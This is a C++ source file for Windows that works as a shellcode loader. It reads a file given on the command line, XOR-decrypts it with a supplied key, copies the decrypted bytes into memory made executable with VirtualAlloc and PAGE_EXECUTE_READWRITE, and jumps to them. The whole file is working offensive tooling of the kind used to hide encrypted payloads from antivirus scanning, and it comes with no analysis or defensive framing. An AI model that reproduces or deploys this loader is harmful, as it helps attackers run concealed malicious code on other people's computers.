#include "windows.h"
#include <iostream>
#include <fstream>
#include <string>

bool XOR2File(const std::string &filename, const std::string &outputFilename, const std::string &key, const uint8_t &mode)
{
    // 1. mode 0: use key
    // 2. mode 1: use file
    std::ifstream inputFile{};
    inputFile.open(filename, std::ios::binary);
    if (!inputFile.is_open())
    {
        return false;
    }
    auto inputString = std::string((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());

    std::ofstream outputFile{};
    outputFile.open(outputFilename, std::ios::binary);
    if (!outputFile.is_open())
    {
        return false;
    }
    if (0 == mode)
    {

        std::string xorString{};
        for (auto i{0}; i < inputString.size(); ++i)
        {
            xorString += inputString[i] ^ key[i % key.size()];
        }
        outputFile << xorString;
    }
    else if (1 == mode)
    {
        std::ifstream keyFile{};
        keyFile.open(key, std::ios::binary);
        if (!keyFile.is_open())
        {
            return false;
        }

        std::string keyString = std::string((std::istreambuf_iterator<char>(keyFile)), std::istreambuf_iterator<char>());

        std::string xorString{};
        for (auto i{0}; i < inputString.size(); ++i)
        {
            xorString += inputString[i] ^ keyString[i % keyString.size()];
        }
        outputFile << xorString;

        inputFile.close();
        keyFile.close();
        outputFile.close();
    }

    return true;
}

bool XOR2String(const std::string &filename, std::string &outputString, const std::string &key, const uint8_t &mode)
{
    // 1. mode 0: use key
    // 2. mode 1: use file
    std::ifstream inputFile{};
    inputFile.open(filename, std::ios::binary);
    if (!inputFile.is_open())
    {
        return false;
    }
    auto inputString = std::string((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());

    if (0 == mode)
    {

        std::string xorString{};
        for (auto i{0}; i < inputString.size(); ++i)
        {
            xorString += inputString[i] ^ key[i % key.size()];
        }
        outputString = xorString;
    }
    else if (1 == mode)
    {
        std::ifstream keyFile{};
        keyFile.open(key, std::ios::binary);
        if (!keyFile.is_open())
        {
            return false;
        }

        std::string keyString = std::string((std::istreambuf_iterator<char>(keyFile)), std::istreambuf_iterator<char>());

        std::string xorString{};
        for (auto i{0}; i < inputString.size(); ++i)
        {
            xorString += inputString[i] ^ keyString[i % keyString.size()];
        }
        outputString = xorString;

        inputFile.close();
        keyFile.close();
    }

    return true;
}

int main(int argc, const char **argv)
{
    std::string filename{argv[1]};
    std::string key{argv[2]};

    std::string outputstring{};
    if (!XOR2String(filename, outputstring, key, 0))
    {
        std::cout << outputstring << std::endl;
        return 1;
    }

    const auto *decryptedData = reinterpret_cast<const unsigned char *>(outputstring.c_str());
    const auto decryptedDataSize = outputstring.size();

    auto mem = VirtualAlloc(NULL, decryptedDataSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (mem == NULL)
    {
        return 1;
    }
    memcpy(mem, decryptedData, decryptedDataSize);
    ((void (*)()) reinterpret_cast<char *>(mem))();
    return 0;
}